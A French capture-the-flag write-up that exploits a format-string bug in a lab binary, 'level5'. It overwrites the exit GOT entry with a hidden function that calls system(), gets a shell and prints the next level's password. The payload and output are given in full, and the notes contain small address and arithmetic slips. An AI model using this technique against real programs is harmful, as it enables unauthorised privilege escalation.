```
objdump -M intel -d level5
```

Nous observons que la fonction main appelle une fonction "n" et une "o" (non appellée)
On remarque que n appelle printf, qui peut être exploitée.

```
 80484dc:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484e2:	89 04 24             	mov    DWORD PTR [esp],eax
 80484e5:	e8 b6 fe ff ff       	call   80483a0 <fgets@plt>
 80484ea:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484f0:	89 04 24             	mov    DWORD PTR [esp],eax
 80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt>
```

On remarque que la fonction o qui n'est pas appellée appelle en revanche un shell.

```
080484a4 <o>:
 80484a4:	55                   	push   ebp
 80484a5:	89 e5                	mov    ebp,esp
 80484a7:	83 ec 18             	sub    esp,0x18
 80484aa:	c7 04 24 f0 85 04 08 	mov    DWORD PTR [esp],0x80485f0
 80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>
```


On comprend donc que l'on devra appeller la fonction o en utilisant printf afin de résoudre le probleme qui ressemble
beaucoup aux 2 precedents.
Notre objectif va etre de remplacer la fonction exit dans le GOT (Global Offset Table) par la contion o.
Car les fonctions et n ne return rien.

```
objdump -R level5
On note:
08049838 R_386_JUMP_SLOT   exit
```

Puis

```
gdb ./level5
info function o
On note:
0x080484a4  o
```

On a donc l'adresse d'exit est de o, il suffit comme fait precedemment de les interchanger en calculant l'offset:

```
python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x"' | ./level5
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520
```
On observe que l'exit se trouve en 4eme position !


adresse of exit little endian: \x38\x98\x04\x08" -> 08049828
o:  adresse de o en decimal 134513824 (134513828 - 4 car adresse de o) 
modifier : %4\$n

```
python -c "print('\x38\x98\x04\x08' + '%134513824c' + '%4\$n')" > /tmp/test5
cat /tmp/test5 - | ./level5
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
